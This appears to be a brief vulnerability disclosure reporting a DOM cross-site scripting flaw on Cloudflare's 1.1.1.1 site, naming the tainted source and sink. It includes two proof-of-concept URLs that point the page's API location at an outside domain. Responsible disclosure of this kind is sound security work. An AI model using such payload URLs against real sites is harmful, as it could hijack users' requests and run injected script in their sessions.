Summary:

After discussion with Cloudflare on twitter I'm reporting this here.
There is a DOM XSS on 1.1.1.1 or one.one.one.one site, it seems like the sink is `XMLHR.open(*,Taint,*,*,*)` and the source is `location.search`

The PoC url's are:
https://1.1.1.1/?ApiLocation=//localdomain.pw
https://one.one.one.one/?ApiLocation=//localdomain.pw
